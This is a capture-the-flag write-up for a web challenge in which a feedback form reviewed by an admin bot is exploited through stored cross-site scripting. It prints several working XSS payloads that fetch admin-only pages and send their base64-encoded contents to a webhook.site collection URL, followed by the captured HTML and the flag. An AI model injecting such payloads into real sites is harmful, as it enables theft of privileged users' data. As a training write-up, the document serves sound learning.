# Feedback form (web) (author: stn)

## Description

```shell
We have prepared a feedback form to understand how to improve CyberXmas further. Everyone will be heard, our admins are checking the received feedback regularly.
```

## Task analysis & solution

This is a web challenge and we're presented with our very own docker instance, hosting a small website. The website consists of three pages, a feedback form, admin and private notes. Both admin and private notes are protected and require admin rights. 

```
GET http://10.10.8.61:36155/admin.php HTTP/1.1


HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 15:50:00 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 339
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Feedback Form</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="navbar">
  <a href="index.php">Give Feedback</a>
  <a class="active" href="admin.php">Admin</a>
  <a href="notes.php">Private Notes</a>
</div> 

<h1 class="header">Admin Feedback Panel</h1><h3>You are not an admin. Go away!</h3>
```

```
HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 15:51:14 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 328
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Private Notes</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="navbar">
  <a href="index.php">Give Feedback</a>
  <a href="admin.php">Admin</a>
  <a class="active" href="notes.php">Private Notes</a>
</div> 


<h1 class="header">Private Notes</h1>

<h3>Only admins can see the notes.</h3>
```

There was nothing of interest in here, no cookies, no funky tags with special handling/meaning.. Then I went back to the description of the problem and something in there actually made an impression:

*``Everyone will be heard, our admins are checking the received feedback regularly``*

Our admins are checking the feedback regularly? This lead me to believe we should submit something in the feedback form to enable cross site scripting and then when the admin executes my malicious code under his access rights, I should be able to get any information back from the page. There was a little problem with that - I couldn't just do a simple ``<script>alert();</script>``, because I'd never get the feedback I need from that. I decided I should send myself a request. Firing up my own webserver seemed cumbersome though, so I found some platform online that provides an address you can use for webhooks - https://website.hook. Upon opening the page you are redirected to your own little website where you can monitor requests. This was my initial little script:

```HTML
<script>
  fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?data=' + window.location.hostname + window.location.port);
</script>
```

Then I waited.. and it worked! I got a request from a certain address, hitting the URL https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?data=localhost

So whatever mechanism is being used, it is hosted within the docker instance and 'going through' the feedback every minute. This is perfect - I could use this to grab the source of the pages I need and hopefully, the flag would be there somewhere. Let's see if we can get the source of the admin page:

```HTML
<script>
fetch('http://localhost/admin.php')
  .then(response => response.text())
  .then(html => {
    fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?data=' + btoa(html));
  });
</script>
``` 

I used btoa() here to encode the page source in base64 for easy 'transportation' :) This little script yielded the following result:

```
PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoNCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4NCiAgICA8dGl0bGU+RmVlZGJhY2sgRm9ybTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzdHlsZS5jc3MiPg0KPC9oZWFkPg0KDQo8Ym9keT4NCg0KPGRpdiBjbGFzcz0ibmF2YmFyIj4NCiAgPGEgaHJlZj0iaW5kZXgucGhwIj5HaXZlIEZlZWRiYWNrPC9hPg0KICA8YSBjbGFzcz0iYWN0aXZlIiBocmVmPSJhZG1pbi5waHAiPkFkbWluPC9hPg0KICA8YSBocmVmPSJub3Rlcy5waHAiPlByaXZhdGUgTm90ZXM8L2E+DQo8L2Rpdj4gDQoNCjxoMSBjbGFzcz0iaGVhZGVyIj5BZG1pbiBGZWVkYmFjayBQYW5lbDwvaDE+PGRpdiBjbGFzcz0iZmVlZGJhY2stY29udGFpbmVyIj48dWwgY2xhc3M9ImZlZWRiYWNrLWxpc3QiPjxsaSBjbGFzcz0iZmVlZGJhY2staXRlbSI+PHA+PHN0cm9uZz5TdGF5a28gTmVkZXY6PC9zdHJvbmc+IDxzY3JpcHQ+DQpmZXRjaCgnaHR0cDovL2xvY2FsaG9zdC9hZG1pbi5waHAnKQ0KICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpDQogIC50aGVuKGh0bWwgPT4gew0KICAgIGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS9hYjVmZjA0OC00YmFhLTRhMTctYWFjMC0xYWVmMzZhYzRhZmMvbG9nP2RhdGE9JyArIGJ0b2EoaHRtbCkpOw0KICB9KTsNCjwvc2NyaXB0PjwvcD48L2xpPjwvdWw+PC9kaXY+DQo8L2JvZHk+DQoNCjwvaHRtbD4=
```

And decoded:

```HTML
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Feedback Form</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="navbar">
  <a href="index.php">Give Feedback</a>
  <a class="active" href="admin.php">Admin</a>
  <a href="notes.php">Private Notes</a>
</div> 

<h1 class="header">Admin Feedback Panel</h1><div class="feedback-container"><ul class="feedback-list"><li class="feedback-item"><p><strong>Stayko Nedev:</strong> <script>
fetch('http://localhost/admin.php')
  .then(response => response.text())
  .then(html => {
    fetch('https://webhook.site/ab5ff048-4baa-4a17-aac0-1aef36ac4afc/log?data=' + btoa(html));
  });
</script></p></li></ul></div>
</body>

</html>
```

Perfect. There's only one problem though, there's no flag here ;( It seems like the admin.php page is just the feedback listing page. Luckily, there's one more page for me to check, the notes.php. Let's do the same for that one:

```HTML
<script>
fetch('http://localhost/notes.php')
  .then(response => response.text())
  .then(html => {
    fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?data=' + btoa(html));
  });
</script>
``` 

This did not produce any results for me though, which got me a bit worried. If no requests are coming in, then that might mean I have an error somewhere. I decided to add some error handling to the javascript code:

```html
<script>
fetch('http://localhost/notes.php')
  .then(r => r.text())
  .then(html => { 
    return fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?notes=' + btoa(html));
  })
  .catch(error => {
    
    let errorDetails = `Name: ${error.name}\nMessage: ${error.message}`;
    
    if (error.stack) {
      errorDetails += `\nStack: ${error.stack}`;
    }

    fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?error=' + btoa(errorDetails));
  });
</script>
```

This showed me there's an encoding problem that ``btoa()`` cannot handle:

```
Name: InvalidCharacterError
Message: Failed to execute 'btoa' on 'Window': The string to be encoded contains characters outside of the Latin1 range.
Stack: InvalidCharacterError: Failed to execute 'btoa' on 'Window': The string to be encoded contains characters outside of the Latin1 range.
    at http://localhost/admin.php:24:93
```

I had to once more modify my little script to get around the issue of ``btoa()`` being unable to handle non-Latin1 characters:

```html
<script>
function base64EncodeUnicode(str) {
  return btoa(
    encodeURIComponent(str).replace(
      /%([0-9A-F]{2})/g,
      (match, p1) => String.fromCharCode('0x' + p1)
    )
  );
}

fetch('http://localhost/notes.php')
  .then(r => r.text())
  .then(html => { 
	const encodedHtml = base64EncodeUnicode(html);
    return fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?notes=' + encodedHtml);
  })
  .catch(error => {
    
    let errorDetails = `Name: ${error.name}\nMessage: ${error.message}`;
    
    if (error.stack) {
      errorDetails += `\nStack: ${error.stack}`;
    }

    fetch('https://webhook.site/78b65235-88ad-411c-9c0e-38c1e2026a9a/log?error=' + btoa(errorDetails));
  });
</script>
```

I submitted my 'feedback' and voala:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Private Notes</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="navbar">
  <a href="index.php">Give Feedback</a>
  <a href="admin.php">Admin</a>
  <a class="active" href="notes.php">Private Notes</a>
</div> 


<h1 class="header">Private Notes</h1>


<div class="notes-container">
    <div class="note" style="--random-rotation: 1;">This is the first note!</div>
    <div class="note" style="--random-rotation: 2;">Don't forget to buy groceries.</div>
    <div class="note" style="--random-rotation: 1;">Plan the next meeting.</div>
    <div class="note" style="--random-rotation: 0;">Update the project roadmap.</div>
    <div class="note" style="--random-rotation: 3;">Christmas party is on Friday!</div>
    <div class="note" style="--random-rotation: 3;">Remember to plan your CTF challenge carefully to keep it accessible for all participants.</div>
    <div class="note" style="--random-rotation: 2;">Christmas coding challenge: Build a holiday-themed app or tool!</div>
    <div class="note" style="--random-rotation: 1;">Use version control! Itâs the gift that keeps on giving. </div>
    <div class="note" style="--random-rotation: 0;">Consider adding extra debugging tips for CTF participants.</div>
    <div class="note" style="--random-rotation: 4;">Give the gift of clean code this Christmas. Start with good documentation.</div>
    <div class="note" style="--random-rotation: 5;">Incorporate cryptography into your CTF challenge for a fun and educational twist.</div>
    <div class="note" style="--random-rotation: 3;">Check your code twice, like Santaâs list, to avoid bugs before release.</div>
    <div class="note" style="--random-rotation: 2;">Festive bug-fixing season: Donât let the Grinch steal your productivity.</div>
    <div class="note" style="--random-rotation: 2;">MilestoneCTF{Thanks_For_The_Feedback_<script>alert('xss')</script>}</div>
    <div class="note" style="--random-rotation: 1;">Add some holiday flair to your user interface designâsnowflakes, anyone?</div>
    <div class="note" style="--random-rotation: 4;">Don't forget the testing phase, like checking if all the Christmas lights are working.</div>
    <div class="note" style="--random-rotation: 0;">While building a CTF challenge, ensure itâs engaging but not too complex for most participants.</div>
    <div class="note" style="--random-rotation: 2;">Track your CTF challenge stats to improve for next year!</div>
    <div class="note" style="--random-rotation: 5;">For a fun CTF twist, have participants solve riddles or puzzles related to Christmas characters.</div>
    <div class="note" style="--random-rotation: 1;">Git is your best friend for version controlânever go coding without it.</div>
    <div class="note" style="--random-rotation: 4;">Christmas coding project idea: Develop a tool that sends Christmas cards automatically!</div>
    <div class="note" style="--random-rotation: 0;">Use unit tests to avoid the chaos of a Christmas morning bug hunt.</div>
    <div class="note" style="--random-rotation: 3;">Make your CTF challenges educational, so participants learn while having fun.</div>
    <div class="note" style="--random-rotation: 2;">Christmas tip: Donât forget to take breaks to recharge and avoid burnout.</div>
    <div class="note" style="--random-rotation: 5;">A code freeze before Christmas gives you time to celebrate without the stress of deployment.</div>
    <div class="note" style="--random-rotation: 1;">Take time to reflect on the yearâs development work and set goals for the next one.</div>

</div>
</body>
</html>
```

The flag was **``MilestoneCTF{Thanks_For_The_Feedback_<script>alert('xss')</script>}``**
